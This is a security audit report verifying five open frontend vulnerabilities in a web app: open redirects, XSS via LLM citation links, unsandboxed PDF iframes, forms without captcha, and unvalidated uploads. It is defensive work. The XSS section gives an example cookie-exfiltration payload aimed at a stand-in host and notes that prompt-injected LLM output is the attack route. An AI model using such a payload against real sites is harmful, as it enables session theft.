# Frontend Security Audit — Phase 3 (UI, Data & AI Integrations) — Verification

**Date:** 2026-05-17
**Mode:** READ-ONLY verification.
**Scope:** External data rendering, file handling, external redirects, anonymous form submissions.

---

## Task 1 — Unvalidated Stripe Redirects (Audit Issue #3)

### Finding: CONFIRMED OPEN at all 4 sites — bytewise unchanged

All four call sites accept `data.url` from a Supabase function response and assign it directly to `window.location.href`. None validates the hostname or protocol before navigation.

| File | Line | Function call | Navigation |
|---|---|---|---|
| `src/components/account/UpgradePlansCard.tsx` | 73–78 | `supabase.functions.invoke("create-checkout-session", { body: { price_id: plan.priceId } })` | `window.location.href = data.url;` |
| `src/components/account/BillingSubscriptionCard.tsx` | 76–79 | `supabase.functions.invoke("create-portal-session", {})` | `window.location.href = data.url;` |
| `src/pages/Pricing.tsx` | 166–171 | `supabase.functions.invoke("create-checkout-session", { body: { price_id: variant.priceId } })` | `window.location.href = data.url;` |
| `src/pages/Account.tsx` | 115–120 | `supabase.functions.invoke("create-checkout-session", { body: { price_id: plan.priceId } })` | `window.location.href = data.url;` |

Identical pattern at all four sites:
```ts
const { data, error } = await supabase.functions.invoke("create-…-session", { … });
if (error) throw error;
if (!data?.url) throw new Error("No checkout URL returned");
window.location.href = data.url;
```

Observations:
- No `new URL(data.url)` / hostname assertion / scheme check anywhere in the four files (grep on `URL(` / `stripe\.com` returns zero matches).
- The only guard is a truthiness check, which lets through `javascript:`, `data:`, and any HTTPS host the edge function happens to return.
- Trust assumption: `create-checkout-session` and `create-portal-session` always return a Stripe-hosted URL. True today (the 2026-05-17 backend audit confirmed the edge functions only ever produce `https://checkout.stripe.com/...` and `https://billing.stripe.com/...`), but a single regression on the edge-function side becomes an immediate phishing redirect on the client.

---

## Task 2 — LLM Citation XSS via `javascript:` URI (Audit Issue #4)

### Finding: CONFIRMED OPEN — bytewise unchanged

### 2.1 `src/components/intelligence/IntelResults.tsx:113–120`

```tsx
{result.citations.map((citation) => (
  <a
    key={citation.index}
    href={citation.url}                              // ← line 116
    target="_blank"
    rel="noopener noreferrer"
    className="…"
  >
    <Badge variant="secondary" className="shrink-0">[{citation.index}]</Badge>
    <span …>{formatUrl(citation.url)}</span>          // ← display only, see below
    <ExternalLink … />
  </a>
))}
```

- `citation.url` originates from Perplexity / LLM output, stored in `intel_queries`, and is rendered straight into `href`.
- The `formatUrl` helper (lines 165–172) calls `new URL(url)` but only for the visible label, not for `href`:
  ```ts
  function formatUrl(url: string): string {
    try {
      const parsed = new URL(url);
      return `${parsed.hostname}${parsed.pathname.length > 30 ? parsed.pathname.slice(0, 30) + '...' : parsed.pathname}`;
    } catch { return url.slice(0, 50) + (url.length > 50 ? '...' : ''); }
  }
  ```
  `new URL("javascript:alert(1)")` succeeds (protocol `javascript:`, hostname empty); the helper would render an empty label but the `href` attribute still contains the raw `javascript:` string and remains clickable.
- `rel="noopener noreferrer"` does **not** defend against `javascript:` URIs — it only controls `window.opener` for HTTP/HTTPS navigations.

### 2.2 `src/components/enterprise/MonitorDetailView.tsx:244–254`

```tsx
{(report.citations as string[]).map((url, i) => (
  <a
    key={i}
    href={url}                                        // ← line 247
    target="_blank"
    rel="noopener noreferrer"
    className="text-[10px] text-primary hover:underline"
  >
    [{i + 1}]
  </a>
))}
```

- `report.citations` is read from `monitor_reports.citations` (`unknown[]`), populated by `run-monitor-scan` from Perplexity output.
- Cast to `string[]` and iterated; each entry goes directly into `href={url}`.
- No URL parsing, no scheme check, no allowlist.

Both files exhibit the same vulnerability: a prompt-injected or compromised LLM response of `javascript:fetch('https://exfil/'+document.cookie)` becomes a one-click XSS in the authenticated origin. `window.supabase` is dev-gated (verified Phase 1), but the authenticated Supabase session token is in `localStorage` and reachable from any same-origin XSS.

---

## Task 3 — PDF Iframe Sandboxing (Audit Issue #10)

### Finding: CONFIRMED OPEN at both sites — bytewise unchanged

### 3.1 `src/components/files/UserFilesManager.tsx:500–506`

```tsx
{previewUrl && (
  <iframe
    src={previewUrl}
    className="w-full flex-1 border-0 rounded"
    title={previewFile?.file_name}
  />
)}
```

### 3.2 `src/components/scenarios/ScenarioFileAttachment.tsx:237–241`

```tsx
{previewUrl && (
  <iframe
    src={previewUrl}
    className="w-full flex-1 border-0 rounded"
    title={previewFile?.file_name}
  />
)}
```

Observations at both sites:
- **No `sandbox` attribute** — the iframe has full ambient authority of its origin (the signed Supabase Storage URL on `*.supabase.co`). PDF.js / embedded PDF JavaScript can execute in that frame, then post messages, open new windows, navigate the parent, etc.
- **No `referrerpolicy`** — the full `https://exosproc.com/account` or scenario-detail URL leaks to Supabase as the `Referer` header on the storage request.
- **No `allow`** restrictions (Permissions-Policy on the iframe).
- File type is constrained upstream (only PDF/XLSX/DOCX are uploaded via `validateFile`), so today's risk surface is malicious PDF JavaScript specifically. A PDF crafted to abuse `app.launchURL`, FormCalc, or embedded JS gets the full origin context.

---

## Task 4 — Anonymous Form Insert Protections (Audit Issue #11)

### Finding: CONFIRMED OPEN — no captcha anywhere in `src/`

### 4.1 Captcha presence (codebase-wide)

```
grep -rniE "turnstile|hcaptcha|recaptcha|captcha" src/ → 0 matches
```

Zero references to any captcha library or token in the entire frontend codebase. No `cf-turnstile-response`, no `h-captcha-response`, no `g-recaptcha-response` headers / body keys passed to any `routeFeedback` / `insert` / `functions.invoke` call.

### 4.2 `src/components/contact/ContactForm.tsx:33–66`

```ts
const onSubmit = async (values: ContactFormValues) => {
  setSubmitting(true);
  try {
    const id = crypto.randomUUID();
    const { error } = await supabase.from("contact_submissions").insert({
      id, name: …, email: …, company: …, subject: …, message: …,
    });
    if (error) throw error;
    setSubmitted(true);
    routeFeedback({                                  // ← line 51
      source: "contact_form", idempotency_key: id, …, page_url: window.location.href,
    });
  } catch { … }
};
```

Direct anonymous `INSERT` to `public.contact_submissions` (relies on RLS `WITH CHECK (true)`) plus a `routeFeedback` call that fans out to Plain (support thread) and Resend (notification email). **No captcha token, no proof-of-work, no client-side rate limit.**

### 4.3 `src/components/feedback/SiteFeedbackButton.tsx:35–67`

Same pattern: `scenario_feedback` insert + `routeFeedback`. No captcha.

### 4.4 `src/components/scenarios/GenericScenarioWizard.tsx:215–239, 573+`

Two feedback paths (`scenario_feedback` modal and `OutputFeedback`). Same pattern. No captcha.

### 4.5 Server-side context

The 2026-05-17 backend audit re-verified that `route-feedback` has a 20/hour IP-keyed rate limit, correctly keyed on `Deno.serve(req, info).remoteAddr.hostname`. **However**, the direct `supabase.from('contact_submissions').insert(...)` and `supabase.from('scenario_feedback').insert(...)` calls bypass `route-feedback` entirely — RLS allows the insert, PostgREST handles it directly, and no rate limit reaches that path. The table-insert side of the abuse vector (flooding the DB and triggering the subsequent `routeFeedback` email fan-out) is undefended.

---

## Task 5 — `FileUploadZone` Validation (Audit Issue #12)

### Finding: CONFIRMED OPEN — bytewise unchanged

**File:** `src/components/enterprise/FileUploadZone.tsx`

```tsx
const handleDrop = useCallback(
  (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragOver(false);
    const dropped = Array.from(e.dataTransfer.files);
    onFilesChange([...files, ...dropped]);               // ← line 28: accepts ANY file
  },
  [files, onFilesChange]
);

const handleFileInput = (e: React.ChangeEvent<HTMLInputElement>) => {
  if (e.target.files) {
    onFilesChange([...files, ...Array.from(e.target.files)]);   // ← line 35: accepts ANY file
  }
};
```

Observations:
- `accept=".pdf,.xlsx,.docx"` (line 73) on the hidden `<input>` is UI-only — the OS file picker filters by it, but the user can override (select "All Files") and drag-and-drop bypasses it entirely.
- `handleDrop` (lines 23–31) calls `onFilesChange([...files, ...dropped])` with no filtering, sizing, MIME inspection, or magic-byte check.
- `handleFileInput` (lines 33–37) is identical.
- No import of `validateFile` / `validateMagicBytes` from `src/lib/file-validation.ts` (the validator exists and is correctly used elsewhere — `useUserFiles.uploadFile:104,128` and `UserFilesManager.tsx:126`).
- `maxSizeMB` is a prop with default 10 MB used only in the UI description text (line 65); never enforced.

### 5.1 Downstream consumer verification

`grep -rn "FileUploadZone" src/` shows two consumers:

1. **`src/components/enterprise/TrackerSetupWizard.tsx:406`** — mounts `<FileUploadZone files={files} onFilesChange={setFiles} />` and reads `files` later for upload. Verified via grep: **no `validateFile` / `validateMagicBytes` / `file.type` / `file.size` check exists in `TrackerSetupWizard.tsx`.** Files flow from `FileUploadZone` straight into the tracker upload mutation with zero validation.

2. **`src/components/files/UserFilesManager.tsx:230`** — also mounts `<FileUploadZone>`. The component independently calls `validateFile(file)` at line 126 in one of its handlers, so that path is gated, but only because the parent re-validates — the component itself contributes nothing.

`useUserFiles.uploadFile()` is the single secure gateway — it validates extension, MIME, magic bytes, size, and path traversal. Whether files from `FileUploadZone` ultimately go through `useUserFiles.uploadFile` depends on each consumer. `TrackerSetupWizard` bypasses it entirely, so an attacker can submit a `.exe`, a 1 GB file, or a malformed XLSX zip-bomb (`extract-file-content` server-side has a 15 MB pre-parse cap per PR #34, but the upload itself, the storage write, and the metadata row are not pre-validated).

---

## Status Matrix — Phase 3 Findings

| Audit ID | Finding | Status | Evidence |
|---|---|---|---|
| #3 | Unvalidated Stripe redirects (`window.location.href = data.url` with no hostname allowlist) | **CONFIRMED OPEN** at all 4 sites | `UpgradePlansCard.tsx:78`, `BillingSubscriptionCard.tsx:79`, `Pricing.tsx:171`, `Account.tsx:120` — identical pattern |
| #4 | `javascript:` URI XSS via LLM citation URLs | **CONFIRMED OPEN** at both sites | `IntelResults.tsx:116` (`formatUrl` helper validates only the display label, not the `href`), `MonitorDetailView.tsx:247` (zero validation) |
| #10 | PDF iframes lack `sandbox` and `referrerpolicy` | **CONFIRMED OPEN** at both sites | `UserFilesManager.tsx:500-506`, `ScenarioFileAttachment.tsx:237-241` — bytewise identical missing-attribute pattern |
| #11 | Anonymous public forms have no captcha / proof-of-work | **CONFIRMED OPEN** — zero captcha library in `src/` | `ContactForm.tsx:37-51`, `SiteFeedbackButton.tsx:38-50`, `GenericScenarioWizard.tsx:220-239, 573+` |
| #12 | `FileUploadZone` does no validation | **CONFIRMED OPEN** | `FileUploadZone.tsx:23-37` accepts anything; `TrackerSetupWizard.tsx:406` consumer also performs no validation; `validateFile`/`validateMagicBytes` exist but are not used by either |

---

## Items outside Phase 3 scope (for completeness)

The 2026-05-17 audit included additional Medium/Low findings not in Phase 3's strict scope, flagged for completeness only:

- `target="_blank"` without `rel` on internal links (`ConsentBlock.tsx:38,42`) — Phase 2-adjacent.
- `SharedReport.tsx:280-282` canonical link emitting the shareId — Phase 2-adjacent.
- `console.error` payload-stripping (`useUserFiles.ts:184`, `chat-service.ts:30`, `lib/ai/graph.ts:156-161`, `useShareableReport.ts:58,71,93,115`).
- esbuild 0.21.x dev-server CVE / jsdom 20 — Phase 1-adjacent.
- `chart.tsx` `style-src 'unsafe-inline'` dependency — Phase 1-adjacent.
- `.lovable/` repo-metadata exposure / `docs/security-audit-*.md` if repo is public — Phase 1-adjacent.

---

## Three-phase frontend re-audit summary

| Phase | Scope | Doc |
|---|---|---|
| Phase 1 | Infrastructure & build | `docs/security-audit-frontend-phase1-2026-05-17.md` |
| Phase 2 | Auth, sessions, PII | `docs/security-audit-frontend-phase2-2026-05-17.md` |
| Phase 3 | UI, data & AI integrations | `docs/security-audit-frontend-phase3-2026-05-17.md` (this file) |
